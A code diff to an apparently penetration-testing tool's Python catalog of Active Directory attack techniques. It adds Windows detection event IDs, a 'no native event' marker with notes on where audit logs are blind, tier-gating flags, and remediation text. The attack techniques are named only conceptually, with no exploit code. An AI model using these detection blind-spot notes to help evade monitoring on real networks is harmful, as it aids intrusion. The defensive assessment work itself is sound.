@@ -103,6 +103,92 @@ SourceContextRequirement = Literal[
 _COMPLEXITY_ORDER: dict[str, int] = {"low": 0, "medium": 1, "high": 2, "very_high": 3}
 
 
+class _NoNativeEventTelemetry(tuple):  # type: ignore[type-arg]
+    """An EMPTY tuple that declares "this technique logs no Windows event".
+
+    Subclassing ``tuple`` and staying empty is deliberate, and it is what makes
+    the sentinel safe to introduce into a field ~90 entries and four renderers
+    already read: a consumer that knows nothing about it sees a falsy, empty
+    tuple of event IDs and renders exactly what it rendered before, so no
+    renderer can ever print a sentinel token into a client document. The
+    consumers that DO care (the coverage matrix's SOC axis and the didactic
+    card) recognise it by identity.
+    """
+
+    __slots__ = ()
+
+
+#: Declares that a technique leaves NO Windows event of its own, as an explicit
+#: statement rather than the absence of one.
+#:
+#: ``detection_event_ids = ()`` is UNDECLARED: nobody has filled it in yet, and
+#: the coverage matrix prints "pendiente" for the SOC column. That is the right
+#: answer for a gap, and the wrong answer for a technique whose whole point is
+#: that it is invisible to the Windows audit log. Timeroasting is the clearest
+#: case: the request is ordinary NTP traffic to the domain controller, so there
+#: is no security event to point a SOC at, and saying so is more valuable to a
+#: CISO than any event ID. Without this sentinel the two cases are the same
+#: value and the honest answer cannot be published.
+#:
+#: AUTHORING RULE: use it ONLY where the technique really leaves no event of its
+#: own. A weak or indirect event is declared as that event instead. Claiming a
+#: blind spot where telemetry exists is the same falsehood class as a false
+#: negative, and this is the one cell a SOC reader will check against their own
+#: SIEM. Every sentinel technique must also carry its English detection note in
+#: :data:`NO_NATIVE_EVENT_DETECTION_NOTES` and its Spanish matrix sentence in
+#: ``safeguard_profile._NO_NATIVE_EVENT_SOC_ES``, both of which must say WHERE
+#: the SOC is blind and what detection it would take instead. Locked by the
+#: detection-telemetry gates in ``tests/unit/test_attack_step_catalog.py``.
+NO_NATIVE_EVENT_TELEMETRY: tuple[str, ...] = _NoNativeEventTelemetry()
+
+
+def declares_no_native_event_telemetry(value: object) -> bool:
+    """True when ``value`` is the :data:`NO_NATIVE_EVENT_TELEMETRY` sentinel.
+
+    Args:
+        value: Either a catalog entry or a ``detection_event_ids`` value.
+
+    Returns:
+        Whether the no-native-event declaration was made. Identity-based, so a
+        plain ``()`` (undeclared) is never mistaken for it.
+    """
+    ids = getattr(value, "detection_event_ids", value)
+    return ids is NO_NATIVE_EVENT_TELEMETRY
+
+
+#: English, learner-facing note for each technique declaring
+#: :data:`NO_NATIVE_EVENT_TELEMETRY`: where the audit log is blind, and the
+#: detection that does see the technique. Rendered by the didactic card's
+#: "How it's detected" section, so it is authored in English like every other
+#: catalog string; the Spanish coverage-matrix wording lives at the Spanish
+#: boundary in ``safeguard_profile``.
+NO_NATIVE_EVENT_DETECTION_NOTES: dict[str, str] = {
+    "timeroasting": (
+        "No native Windows event: the request is a legitimate MS-SNTP time "
+        "request to the domain controller, which the security audit log does "
+        "not record. Detection is network telemetry: the volume of MS-SNTP "
+        "requests carrying machine-account identifiers arriving from one host."
+    ),
+    "ldapanonymousbind": (
+        "No native Windows event: domain controllers do not audit LDAP binds, "
+        "so an anonymous bind and its directory reads leave the security log "
+        "untouched. Visibility comes from raising the LDAP interface "
+        "diagnostic logging on the domain controller, which records unsigned "
+        "and cleartext binds, or from network telemetry of port 389 binds "
+        "carrying an empty distinguished name."
+    ),
+    "ms17-010": (
+        "No native Windows event: the exploit is carried inside SMBv1 "
+        "pre-authentication traffic, so neither a successful nor a failed "
+        "attempt produces a security event, and a kernel crash is all the host "
+        "may show. Detection is network inspection of the malformed SMBv1 "
+        "transaction; the useful precursor signal is enabling SMBv1 access "
+        "auditing on the server, which records legitimate SMBv1 use and so "
+        "shows the exposure the exploit needs."
+    ),
+}
+
+
 @dataclass(frozen=True, slots=True)
 class AttackStepCatalogEntry:
     """Definition for one attack-step relation."""
@@ -122,7 +208,23 @@ class AttackStepCatalogEntry:
     mitre_technique_name: str | None = (
         None  # e.g. "Steal or Forge Kerberos Tickets: Kerberoasting"
     )
-    detection_event_ids: tuple[str, ...] = ()  # Windows Event IDs for SOC detection
+    # Windows Event IDs a SOC can hunt this technique on. Feeds the coverage
+    # matrix's SOC column and the didactic card's "How it's detected" section.
+    #
+    #   ``("4769", …)``                -> declared: these are the events.
+    #   ``NO_NATIVE_EVENT_TELEMETRY``  -> declared: the technique leaves NO
+    #                                     Windows event of its own, and the
+    #                                     detection that does see it is named
+    #                                     in NO_NATIVE_EVENT_DETECTION_NOTES.
+    #   ``()``                         -> UNDECLARED. The coverage matrix prints
+    #                                     "pendiente" and the generator refuses
+    #                                     to publish without --allow-pending.
+    #
+    # The sentinel exists because ``()`` cannot express the honest answer: a
+    # technique that is invisible to the audit log by design looks identical to
+    # one nobody has filled in yet. See :data:`NO_NATIVE_EVENT_TELEMETRY` for
+    # the authoring rule (never claim a blind spot where telemetry exists).
+    detection_event_ids: tuple[str, ...] = ()
     bh_native: bool = False  # True = edge exists natively in BloodHound CE's graph
     bh_cypher_names: tuple[
         str, ...
@@ -141,6 +243,51 @@ class AttackStepCatalogEntry:
     # What makes this step a client finding when it was not executed. See
     # :data:`FindingBasis`. Consumed by the attack-graph → finding derivation.
     finding_basis: FindingBasis = "observed_configuration"
+    # Whether this finding is TIER-GATED or a CONDITION (always-fire). See
+    # the ACL/tier-jump finding-gate spec
+    # (docs/superpowers/specs/2026-10-02-acl-tier-jump-finding-gate.md § 2-3).
+    #   True  -> TIER-GATED: the finding fires only when the SOURCE PRINCIPAL
+    #            escalates a boundary it should not (upward tier crossing or a
+    #            forest-trust crossing). Routed through the SSOT gate predicate
+    #            at the finding-materialization seam. DCSync, the generic control
+    #            group, constrained delegation, RBCD, LAPS/gMSA read, ADCS ESCs.
+    #   False -> CONDITION: always-fire on its state; severity still modulated by
+    #            context. kerberoast/asreproast, SMBv1, CVEs, krbtgt age,
+    #            shadow_credentials_present, unconstrained_delegation, coercion,
+    #            trust config, the NTLM/Kerberos posture findings, etc.
+    #   None  -> UNDECLARED. Only valid for an entry with NO vuln_key (not a
+    #            finding). A structural test
+    #            (tests/unit/test_catalog_source_tier_gated_total.py) FAILS CI if
+    #            any vuln_key-bearing entry leaves this None, so the tier-gated vs
+    #            condition decision is forced at authoring time with no silent
+    #            default.
+    source_tier_gated: bool | None = None
+    # What this technique's execution WRITES into the client's environment, as
+    # the tuple of ``EnvironmentChangeLedger`` change ``kind`` tokens its
+    # execution path registers (keys of ``cleanup_taxonomy.KIND_DISPLAY``).
+    #
+    # This is the ONE safeguard axis that is NOT derivable from any other
+    # module, so it is declared HERE, beside the technique, and every consumer
+    # (the customer-facing coverage matrix, the reports, the web platform) reads
+    # it from the catalog instead of keeping its own copy. The rollback
+    # lifecycle, the directory-vs-endpoint scope and the client-facing label of
+    # each change are all DERIVED from these kinds (see
+    # ``services/safeguard_profile.py``) rather than re-declared, so a declared
+    # attribute can never contradict what the guardrail and the change ledger
+    # actually do.
+    #
+    #   ``()``   -> declares the technique modifies NOTHING (read-only).
+    #   ``None`` -> UNDECLARED. The coverage matrix prints "pendiente" for the
+    #               derived columns and the generator refuses to publish without
+    #               ``--allow-pending``; a structural test fails CI when a NEW
+    #               customer-facing technique leaves this None, so adding a
+    #               technique without its impact data fails loudly instead of
+    #               shipping a silent gap.
+    #
+    # Declared in ``_ENVIRONMENT_CHANGE_DECLARATIONS`` (with the
+    # ``register_change`` call site that proves each kind) and applied below,
+    # following the same overlay pattern as the narratives.
+    environment_change_kinds: tuple[str, ...] | None = None
     # BloodHound-style narrative templates with placeholders.
     # Placeholders resolved at render time by render_step_narrative():
     #   {source}      — display name of source principal
@@ -219,6 +366,7 @@ def _entry(
     execution_target_access_requirement: ExecutionTargetAccessRequirement = "none",
     execution_determinism: ExecutionDeterminism = "deterministic",
     finding_basis: FindingBasis = "observed_configuration",
+    source_tier_gated: bool | None = None,
     narrative_template: str = "",
     short_narrative_template: str = "",
     manual_command: str = "",
@@ -255,6 +403,7 @@ def _entry(
         execution_target_access_requirement=execution_target_access_requirement,
         execution_determinism=execution_determinism,
         finding_basis=finding_basis,
+        source_tier_gated=source_tier_gated,
         narrative_template=narrative_template.strip(),
         short_narrative_template=short_narrative_template.strip(),
         manual_command=manual_command.strip(),
@@ -296,6 +445,11 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         can_fully_mitigate=True,
         mitre_technique_id="T1098",
         mitre_technique_name="Account Manipulation",
+        # Same telemetry as AddMember / AddSelf, because the control IS the
+        # membership: 4728 / 4732 / 4756 record the addition to a global, local
+        # or universal group, and 4672 fires when the member next logs on and
+        # the privileged rights that group confers are assigned to the session.
+        detection_event_ids=("4728", "4732", "4756", "4672"),
     ),
     _entry(
         "backupoperatorescalation",
@@ -329,6 +483,12 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         can_fully_mitigate=True,
         mitre_technique_id="T1547.006",
         mitre_technique_name="Boot or Logon Autostart Execution: Kernel Modules and Extensions",
+        # The abuse route is the print spooler's driver installation, so it
+        # surfaces on the same event as PrintNightmare: PrintService/Admin 316
+        # (printer driver installed). 4672 fires on the Print Operator's logon,
+        # when the driver-load right that makes the abuse possible is assigned
+        # to the session.
+        detection_event_ids=("316", "4672"),
     ),
     _entry(
         "dnsadminabuse",
@@ -343,6 +503,13 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         can_fully_mitigate=True,
         mitre_technique_id="T1543.003",
         mitre_technique_name="Create or Modify System Process: Windows Service",
+        # ServerLevelPluginDll abuse points the DNS service at an attacker DLL.
+        # The DNS Server service logs the plugin load outcome as DNS-Server-
+        # Service 150 (could not load or initialize the plug-in DLL) and
+        # 770 / 771 (plug-in DLL failure), and with registry auditing enabled
+        # the write to the ServerLevelPluginDll value itself is 4657.
+        # Source: https://detection.fyi/sigmahq/sigma/windows/builtin/dns_server/win_dns_server_susp_server_level_plugin_dll/
+        detection_event_ids=("150", "770", "771", "4657"),
     ),
     _entry(
         "preparerodccredentialcaching",
@@ -357,6 +524,11 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         can_fully_mitigate=True,
         mitre_technique_id="T1098",
         mitre_technique_name="Account Manipulation",
+        # Identical telemetry to ManageRodcPrp, which is the same write seen
+        # from the ACL side: 5136 records the directory modification of
+        # msDS-RevealOnDemandGroup on the RODC computer object and 4662 the
+        # access to it.
+        detection_event_ids=("5136", "4662"),
     ),
     _entry(
         "extractrodckrbtgtsecret",
@@ -371,6 +543,12 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         can_fully_mitigate=False,
         mitre_technique_id="T1003",
         mitre_technique_name="OS Credential Dumping",
+        # Same shape as BackupOperatorEscalation, the catalog's other
+        # registry/LSA secret extraction over the network: 4624 for the logon
+        # to the RODC, 4656 / 4663 for the handle to and read of the secret,
+        # plus 5145 for the administrative-share access that stages the
+        # extractor (the technique declares a file_uploaded change).
+        detection_event_ids=("4624", "4656", "4663", "5145"),
     ),
     _entry(
         "forgerodcgoldenticket",
@@ -385,6 +563,11 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         can_fully_mitigate=False,
         mitre_technique_id="T1558.001",
         mitre_technique_name="Steal or Forge Kerberos Tickets: Golden Ticket",
+        # The forging itself is offline and logs nothing, so the detectable
+        # moment is the forged ticket's USE, exactly as for RaiseChild: a 4769
+        # service-ticket request with no preceding 4768, since no AS exchange
+        # ever happened for that principal.
+        detection_event_ids=("4769", "4768"),
     ),
     _entry(
         "kerberoskeylist",
@@ -399,6 +582,10 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         can_fully_mitigate=False,
         mitre_technique_id="T1558",
         mitre_technique_name="Steal or Forge Kerberos Tickets",
+        # The Key List request rides a normal TGS exchange against the writable
+        # domain controller, so the DC logs it as 4769, the same event
+        # Kerberoasting is hunted on.
+        detection_event_ids=("4769",),
     ),
     _entry(
         "localadminpassreuse",
@@ -516,15 +703,18 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         source_context_requirement="local_admin_session",
         category="privilege",
         description=(
-            "High-value user session observed on a non-Tier-0 computer that can be "
-            "abused for scheduled-task impersonation"
+            "A higher-tier account has a logon session on a lower-tier host (a tiered-admin "
+            "violation), exposing its credential for scheduled-task impersonation or "
+            "credential theft once the host is locally compromised"
         ),
         vuln_key="da_sessions",
+        source_tier_gated=False,
         remediation_complexity="medium",
         remediation_effort=(
-            "Restrict Domain Admin logons to Tier 0 assets only. "
-            "Use PAWs for privileged operations and prohibit DA logons on member servers/workstations. "
-            "Enforce ESAE/PAW model and monitor tier-zero session exposure."
+            "Enforce the ESAE tiered-admin model: deny higher-tier accounts logon rights on "
+            "lower-tier hosts, require Privileged Access Workstations for Tier 0, place Tier 0 "
+            "accounts in Protected Users, and bind privileged logon to Authentication Policy Silos. "
+            "Monitor for any higher-tier session on a lower-tier host."
         ),
         can_fully_mitigate=True,
         mitre_technique_id="T1053.005",
@@ -543,6 +733,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         description="Netlogon cryptographic flaw exploitation path",
         source_context_requirement="none",
         vuln_key="zerologon",
+        source_tier_gated=False,
         remediation_complexity="low",
         remediation_effort=(
             "Apply CVE-2020-1472 patch and enforce full Secure Channel enforcement "
@@ -562,6 +753,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         description="NoPac domain takeover path",
         source_context_requirement="none",
         vuln_key="nopac",
+        source_tier_gated=False,
         remediation_complexity="low",
         remediation_effort=(
             "Apply November 2021 Patch Tuesday updates (KB5008380 / KB5008602). "
@@ -580,6 +772,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="cve",
         description="PrintNightmare privileged code execution path",
         vuln_key="printnightmare",
+        source_tier_gated=False,
         remediation_complexity="medium",
         remediation_effort=(
             "Apply CVE-2021-34527 patch. Disable the Print Spooler service on all DCs. "
@@ -598,6 +791,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="cve",
         description="EternalBlue SMBv1 remote code execution path",
         vuln_key="ms17-010",
+        source_tier_gated=False,
         remediation_complexity="low",
         remediation_effort=(
             "Apply MS17-010 patch (KB4012212 or later). "
@@ -607,7 +801,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         can_fully_mitigate=True,
         mitre_technique_id="T1210",
         mitre_technique_name="Exploitation of Remote Services",
-        detection_event_ids=(),
+        detection_event_ids=NO_NATIVE_EVENT_TELEMETRY,
         bh_cypher_names=("MS17010",),
     ),
     _entry(
@@ -618,6 +812,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="cve",
         description="MSEven coercion-style authentication trigger path",
         vuln_key="mseven",
+        source_tier_gated=False,
         remediation_complexity="low",
         remediation_effort=(
             "Apply MS17-010 patch (KB4012212 or later). "
@@ -640,6 +835,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="delegation",
         description="Abuse AllowedToDelegate paths to impersonate users to delegated services",
         vuln_key="constrained_delegation",
+        source_tier_gated=True,
         remediation_complexity="high",
         remediation_effort=(
             "Audit msDS-AllowedToDelegateTo and remove unnecessary delegated SPNs. "
@@ -670,7 +866,16 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         source_context_requirement="machine_credential",
         category="delegation",
         description="Resource-based constrained delegation attack path",
-        vuln_key="rbcd_exploitable",
+        # The populated inbound RBCD STATE (the target computer already carries a
+        # msDS-AllowedToActOnBehalfOfOtherIdentity trust) is a CONDITION / backdoor
+        # review item like shadow credentials: its presence is worth reviewing
+        # regardless of any tier crossing (it may be a legitimate delegation or a
+        # planted persistence backdoor), so it is NOT tier-gated. The separate
+        # WRITE-right that lets a principal SET this attribute is the
+        # ``writeaccountrestrictions`` relation, which is folded into the tier-gated
+        # ``excessive_cross_tier_rights`` grouped finding.
+        vuln_key="rbcd_configured",
+        source_tier_gated=False,
         remediation_complexity="medium",
         remediation_effort=(
             "Remove or clear the msDS-AllowedToActOnBehalfOfOtherIdentity attribute "
@@ -687,23 +892,39 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         execution_target_access_requirement="computer_reachable",
     ),
     _entry(
-        "coercetotgt",
+        # The host-condition finding the collector actually emits: a self-loop
+        # ``UnconstrainedDelegation`` edge on every NON-DC principal carrying the
+        # TRUSTED_FOR_DELEGATION flag (the non-DC gate lives in the collector,
+        # ``persistence._persist_delegation_steps`` — a DC holds this flag by
+        # design, so reporting it would be a tautological false positive). This is
+        # the sole producer of the ``unconstrained_delegation`` vuln_key (the dead
+        # BloodHound-CE ``coercetotgt`` relation that used to share it was removed
+        # once native collection became the only graph source). CONDITION
+        # (``source_tier_gated=False``): the weakness is the flag itself,
+        # independent of any tier crossing, so it bypasses the tier-jump gate.
+        "unconstraineddelegation",
         support_kind="unsupported",
-        support_reason="Not implemented yet in ADscan",
+        support_reason="Condition detected from userAccountControl; coercion + TGT capture not auto-executed",
         category="delegation",
-        description="Coerce a target into providing a usable TGT for delegation abuse",
+        description=(
+            "A non-domain-controller account is trusted for unconstrained Kerberos "
+            "delegation, so it caches the forwardable ticket of every user that "
+            "authenticates to it"
+        ),
         vuln_key="unconstrained_delegation",
+        source_tier_gated=False,
         remediation_complexity="medium",
         remediation_effort=(
-            "Block authentication coercion by disabling vulnerable RPC endpoints. "
-            "Enable EPA on LDAP and ADCS. Mark sensitive accounts as delegation-exempt."
+            "Remove the TRUSTED_FOR_DELEGATION flag from the host unless it is "
+            "operationally required, and migrate the service to constrained or "
+            "resource-based constrained delegation scoped to the specific back-end "
+            "services it needs."
         ),
         can_fully_mitigate=True,
-        mitre_technique_id="T1187",
-        mitre_technique_name="Forced Authentication",
+        mitre_technique_id="T1558",
+        mitre_technique_name="Steal or Forge Kerberos Tickets",
         detection_event_ids=("4768", "4769"),
-        bh_native=True,
-        bh_cypher_names=("CoerceToTGT",),
+        bh_native=False,
     ),
     _entry(
         "kerberoasting",
@@ -715,6 +936,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="kerberos",
         description="Offline crack service ticket material for credential recovery",
         vuln_key="kerberoast",
+        source_tier_gated=False,
         remediation_complexity="medium",
         remediation_effort=(
             "Migrate SPN-bearing service accounts to Group Managed Service Accounts (gMSA). "
@@ -738,6 +960,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="kerberos",
         description="Offline crack AS-REP material from users without preauth",
         vuln_key="asreproast",
+        source_tier_gated=False,
         remediation_complexity="low",
         remediation_effort=(
             "Enable Kerberos pre-authentication on all accounts "
@@ -757,6 +980,15 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         source_context_requirement="none",
         category="credential_access",
         description="Offline crack MS-SNTP challenge material from machine accounts",
+        # CONDITION / roasting finding (``source_tier_gated=False``): like
+        # kerberoast and asreproast it bypasses the tier-jump gate. Unlike those
+        # two, the ``Timeroasting`` graph edge is emitted ONLY after the machine
+        # account password is actually CRACKED (every machine is timeroastable, so
+        # emitting on roastability would be unmanageable noise), so this finding is
+        # proven-only by construction — it surfaces only for cracked machine
+        # accounts, i.e. a confirmed weak / manually-set / non-rotating password.
+        vuln_key="timeroast",
+        source_tier_gated=False,
         remediation_complexity="medium",
         remediation_effort=(
             "Keep automatic machine-account password rotation enabled. Reset or rejoin "
@@ -766,6 +998,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         can_fully_mitigate=True,
         mitre_technique_id="T1110.002",
         mitre_technique_name="Brute Force: Password Cracking",
+        detection_event_ids=NO_NATIVE_EVENT_TELEMETRY,
         bh_cypher_names=("Timeroasting",),
     ),
     _entry(
@@ -783,6 +1016,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
             "and NT hash retrieval"
         ),
         vuln_key="shadow_credentials_present",
+        source_tier_gated=False,
         remediation_complexity="medium",
         remediation_effort=(
             "Audit all msDS-KeyCredentialLink values via LDAP. "
@@ -1242,6 +1476,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="lateral_movement",
         description="Guest SMB session accepted, enabling unauthenticated share access",
         vuln_key="smb_guest_shares",
+        source_tier_gated=False,
         remediation_complexity="low",
         remediation_effort=(
             "Disable guest SMB access and null sessions via GPO. "
@@ -1282,6 +1517,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="adcs",
         description="Enroll exploitable template and authenticate as target",
         vuln_key="adcs_esc1",
+        source_tier_gated=True,
         remediation_complexity="medium",
         remediation_effort=(
             "Disable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT on the certificate template, "
@@ -1303,6 +1539,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="adcs",
         description="ADCS ESC2 privilege escalation path",
         vuln_key="adcs_esc2",
+        source_tier_gated=True,
         remediation_complexity="medium",
         remediation_effort=(
             "Remove Any Purpose EKU or CA issuance rights from the template. "
@@ -1324,6 +1561,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="adcs",
         description="Use enrollment agent cert to request impersonation certs",
         vuln_key="adcs_esc3",
+        source_tier_gated=True,
         remediation_complexity="medium",
         remediation_effort=(
             "Remove enrollment agent rights from the template or restrict "
@@ -1345,6 +1583,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="adcs",
         description="Modify template permissions/configuration for abuse",
         vuln_key="adcs_esc4",
+        source_tier_gated=True,
         remediation_complexity="medium",
         remediation_effort=(
             "Remove GenericWrite/WriteDACL/WriteOwner permissions from "
@@ -1370,6 +1609,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="adcs",
         description="ADCS ESC5 privilege escalation path",
         vuln_key="adcs_esc5",
+        source_tier_gated=True,
         remediation_complexity="medium",
         remediation_effort=(
             "Restrict ACL permissions on CA objects and PKI containers in AD. "
@@ -1391,6 +1631,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="adcs",
         description="ADCS ESC6 privilege escalation path",
         vuln_key="adcs_esc6",
+        source_tier_gated=True,
         remediation_complexity="high",
         remediation_effort=(
             "Remove EDITF_ATTRIBUTESUBJECTALTNAME2 flag from the CA via certutil. "
@@ -1412,6 +1653,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="adcs",
         description="ADCS ESC7 privilege escalation path",
         vuln_key="adcs_esc7",
+        source_tier_gated=True,
         remediation_complexity="high",
         remediation_effort=(
             "Remove the ManageCA or ManageCertificates rights from non-privileged principals. "
@@ -1433,6 +1675,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="adcs",
         description="ADCS ESC8 privilege escalation path",
         vuln_key="adcs_esc8",
+        source_tier_gated=True,
         remediation_complexity="high",
         remediation_effort=(
             "Enforce HTTPS on all CA web enrollment endpoints. "
@@ -1456,6 +1699,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="adcs",
         description="ADCS ESC9 privilege escalation path",
         vuln_key="adcs_esc9",
+        source_tier_gated=True,
         remediation_complexity="high",
         remediation_effort=(
             "Deploy KB5014754 and set StrongCertificateBindingEnforcement=2 on all DCs. "
@@ -1478,6 +1722,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="adcs",
         description="ADCS ESC10 privilege escalation path",
         vuln_key="adcs_esc10",
+        source_tier_gated=True,
         remediation_complexity="high",
         remediation_effort=(
             "Set StrongCertificateBindingEnforcement=2 on all DCs. "
@@ -1499,6 +1744,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="adcs",
         description="ADCS ESC11 privilege escalation path",
         vuln_key="adcs_esc11",
+        source_tier_gated=True,
         remediation_complexity="high",
         remediation_effort=(
             "Enforce HTTPS and EPA on ICPR/RPC endpoint for the CA. "
@@ -1520,6 +1766,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="adcs",
         description="ADCS ESC13 effective linked-group membership path",
         vuln_key="adcs_esc13",
+        source_tier_gated=True,
         remediation_complexity="medium",
         remediation_effort=(
             "Remove OID group link from the issuance policy on the template, "
@@ -1541,6 +1788,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="adcs",
         description="ADCS ESC14 privilege escalation path",
         vuln_key="adcs_esc14",
+        source_tier_gated=True,
         remediation_complexity="high",
         remediation_effort=(
             "Remove weak explicit certificate mappings from altSecurityIdentities, "
@@ -1562,6 +1810,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="adcs",
         description="ADCS ESC15 privilege escalation path",
         vuln_key="adcs_esc15",
+        source_tier_gated=True,
         remediation_complexity="medium",
         remediation_effort=(
             "Upgrade the certificate template schema version to v2 or higher, "
@@ -1583,6 +1832,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="adcs",
         description="ADCS ESC16 privilege escalation path",
         vuln_key="adcs_esc16",
+        source_tier_gated=True,
         remediation_complexity="high",
         remediation_effort=(
             "Re-enable szOID_NTDS_CA_SECURITY_EXT on the CA and enforce strong "
@@ -1604,6 +1854,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="adcs",
         description="ADCS ESC17 privilege escalation path",
         vuln_key="adcs_esc17",
+        source_tier_gated=True,
         remediation_complexity="high",
         remediation_effort=(
             "Restrict enrollment on Server Authentication templates and disable "
@@ -1615,6 +1866,46 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         detection_event_ids=("4886", "4887"),
         bh_native=False,
         bh_cypher_names=("ADCSESC17",),
+    ),
+    _entry(
+        "certighost",
+        support_kind="unsupported",
+        support_reason=(
+            "Certighost detection is read-only (CA policy flag plus host "
+            "patch-level analysis); exploitation is not automated in ADscan and "
+            "does not change the environment, so no rollback is involved."
+        ),
+        compromise_semantics="direct_target_compromise",
+        compromise_effort="high",
+        category="adcs",
+        description=(
+            "Certighost (CVE-2026-54121): the certificate authority chase "
+            "fallback trusts a requester-supplied domain controller, letting a "
+            "standard user obtain a certificate that authenticates as a domain "
+            "controller"
+        ),
+        vuln_key="certighost",
+        source_context_requirement="none",
+        source_tier_gated=False,
+        remediation_complexity="low",
+        remediation_effort=(
+            "Apply the July 2026 update on the certificate authority host and "
+            "disable the chase fallback by clearing the EDITF_ENABLECHASECLIENTDC "
+            "policy flag, then restart the CA service."
+        ),
+        can_fully_mitigate=True,
+        mitre_technique_id="T1649",
+        mitre_technique_name="Steal or Forge Authentication Certificates",
+        detection_event_ids=(
+            "4741",
+            "4886",
+            "4887",
+            "4768",
+            "4769",
+            "4662",
+            "4624",
+        ),
+        bh_native=False,
     ),
     _entry(
         "coerceandrelayntlmtoadcs",
@@ -1645,6 +1936,8 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         compromise_effort="immediate",
         category="acl_ace",
         description="Full object control over target principal/object",
+        vuln_key="excessive_cross_tier_rights",
+        source_tier_gated=True,
         remediation_complexity="medium",
         remediation_effort=(
             "For each affected object listed in the per-path remediation steps and the "
@@ -1673,6 +1966,8 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         compromise_effort="low",
         category="acl_ace",
         description="Write permissions over target object attributes",
+        vuln_key="excessive_cross_tier_rights",
+        source_tier_gated=True,
         remediation_complexity="medium",
         remediation_effort=(
             "For each affected object listed in the per-path remediation steps and the "
@@ -1703,6 +1998,8 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         compromise_effort="immediate",
         category="acl_ace",
         description="Object ownership grants implicit GenericAll-equivalent rights",
+        vuln_key="excessive_cross_tier_rights",
+        source_tier_gated=True,
         remediation_complexity="medium",
         remediation_effort=(
             "Transfer object ownership to Domain Admins or SYSTEM. "
@@ -1724,7 +2021,8 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         compromise_effort="immediate",
         category="acl_ace",
         description="Reset target account password without current password",
-        vuln_key="force_change_password",
+        vuln_key="excessive_cross_tier_rights",
+        source_tier_gated=True,
         remediation_complexity="low",
         remediation_effort=(
             "Remove ForceChangePassword (User-Force-Change-Password extended right) "
@@ -1746,6 +2044,8 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         compromise_effort="low",
         category="acl_ace",
         description="Self-add to controlled group under permissive ACL",
+        vuln_key="excessive_cross_tier_rights",
+        source_tier_gated=True,
         remediation_complexity="low",
         remediation_effort=(
             "Remove Self-Membership right from non-privileged principals on the target group."
@@ -1766,6 +2066,8 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         compromise_effort="low",
         category="acl_ace",
         description="Add arbitrary members to target group",
+        vuln_key="excessive_cross_tier_rights",
+        source_tier_gated=True,
         remediation_complexity="low",
         remediation_effort=(
             "Remove AddMember rights from non-privileged principals on the target group. "
@@ -1788,6 +2090,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
         category="acl_ace",
         description="Read gMSA managed password material",
         vuln_key="gmsa_readable",
+        source_tier_gated=True,
         remediation_complexity="low",
         remediation_effort=(
             "Restrict PrincipalsAllowedToRetrieveManagedPassword to only the specific "
@@ -1810,6 +2113,7 @@ _CATALOG_ENTRIES: tuple[AttackStepCatalogEntry, ...] = (
